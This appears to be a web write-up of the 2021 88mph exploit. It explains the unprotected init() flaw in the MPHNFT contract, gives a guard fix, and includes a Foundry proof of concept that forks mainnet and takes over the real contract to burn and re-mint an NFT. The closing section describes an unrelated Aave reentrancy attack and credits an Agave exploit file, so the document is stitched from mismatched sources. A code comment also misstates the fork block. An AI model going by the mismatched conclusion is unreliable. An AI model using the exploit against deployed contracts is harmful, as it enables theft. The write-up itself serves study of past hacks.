# 88mph


## What's 88mph?

88mph is an Ethereum-based, decentralized application (dApp) 
for users who want to borrow and lend at a fixed interest rate. 
But instead of being a self-contained protocol, 88mph is actually a mediator
for more popular third-party lending dApps, such as Aave or Compound. It’s designed
for advanced DeFi investors who understand the perils of financial complexity.


## Amount stolen
$6.5 million USD

JUNE 15, 2021

## Vulnerability
```unprotected init()```



## Analysis

In the MPHNFT contract, there was a vulnerability present in 
init() function, which allowed any user to claim ownership of the contract. 
Best practices recommend using a constructor or an initialization 
guard to ensure that the initialization process happens only once.


### Exploited code

```solidity
    function init( 
        address newOwner,
        string calldata tokenName,
        string calldata tokenSymbol
    ) external {
        _transferOwnerShip(newOwner);
        _tokenName = tokenName;
        _tokenSymbol = tokenSymbol;

        _registerInterface(_INTERFACE_ID_ERC721_METADATA);
        _registerInterface(_INTERFACE_ID_ERC165);
        _registerInterface(_INTERFACE_ERC721);
    }
```
### A guard would simply look like this

```solidity
    bool private initialized = false;

    modifier onlyUninitialized() {
          require(!initialized, "MPHNFT: already initialized");
          _;
      }

    function init( 
        address newOwner,
        string calldata tokenName,
        string calldata tokenSymbol
    ) external onlyUninitialized {
        initialized = true;

        _transferOwnerShip(newOwner);
        _tokenName = tokenName;
        _tokenSymbol = tokenSymbol;

        _registerInterface(_INTERFACE_ID_ERC721_METADATA);
        _registerInterface(_INTERFACE_ID_ERC165);
        _registerInterface(_INTERFACE_ERC721);

    }
```






# proof of concept (PoC) 

selects a fork of the sepecified network

Because of the lack of access control we can simply call the `init` function to 
claim owner ship of the contract

Now that contract ownership has been established, 
it does not imply ownership of all the NFTs. However,
we gain the ability to manipulate the NFTs by using the `burn` operation 
to delete existing tokens and the `mint` operation to create new ones.

by burning a token it gets deleted and it allows the user to 



`mphNFT.mint(address(this), 1); // mint a new token 1`


 
```solidity
   // SPDX-License-Identifier: UNLICENSED
   pragma solidity ^0.8.10;

   
contract ContractTest is DSTest {
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    I88mph mphNFT = I88mph(0xF0b7DE03134857391d8D43Ed48e20EDF21461097);

    function setUp() public {
        cheats.createSelectFork("mainnet", 12_516_705); //fork mainnet at block 13715025
    }

    function testExploit() public {
        console.log("Before exploiting, NFT contract owner:", mphNFT.owner());
        mphNFT.init(address(this), "0", "0"); // exploit here, change owner to this contract address
        console.log("After exploiting, NFT contract owner:", mphNFT.owner());
        console.log("NFT Owner of #1: ", mphNFT.ownerOf(1));
        mphNFT.burn(1); //burn the token 1
        cheats.expectRevert(bytes("ERC721: owner query for nonexistent token"));
        console.log("After burning: NFT Owner of #1: ", mphNFT.ownerOf(1)); // token burned, nonexistent token
        mphNFT.mint(address(this), 1); // mint a new token 1
        console.log("After exploiting: NFT Owner of #1: ", mphNFT.ownerOf(1)); // token 1 now owned by us
    }

    function onERC721Received(address, address, uint256, bytes memory) public returns (bytes4) {
        return this.onERC721Received.selector;
    }
}
```

## Conclusion

The reentrancy attack in this context occurs within the `attackLogic` function, specifically when the liquidation call is initiated on the WETH asset within the Aave lending pool. Let's break down one more time how the reentrancy attack was executed:

### 1. Initiate Liquidation Call

- The `lendingPool.liquidationCall` function is invoked, initiating a liquidation call on the WETH asset.
- This call triggers the `ontokentransfer` function on the `.burn` method of the aToken, creating a reentrancy point.

### 2. Reentrancy in Liquidation Call

- As part of the Aave protocol's design, the `liquidationCall` function interacts with the aToken's `.burn` method.
- During this interaction, the aToken executes a series of actions, including transferring funds and updating internal states.

### 3. Reentrancy into External Function

- Since the `.burn` method can trigger external calls, control is transferred back to the `onTokenTransfer` function in your contract.

### 4. BorrowMaxtokens Execution

- The `borrowMaxtokens` function is then executed, allowing for the maximization of borrowing.
- This function interacts with the Aave lending pool to borrow additional funds based on the current state and conditions.

In summary, the reentrancy attack takes advantage of the reentrancy point created during the liquidation call. By triggering external calls within the Aave protocol, control is transferred back to your contract, allowing you to execute further actions, such as additional borrowing. This sequence of events exploits the vulnerability in the Aave protocol, leading to the reentrancy attack.

**Code provided by:** [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/Agave_exp.sol)


[**< Back**](https://patronasxdxd.github.io/CTFS/)
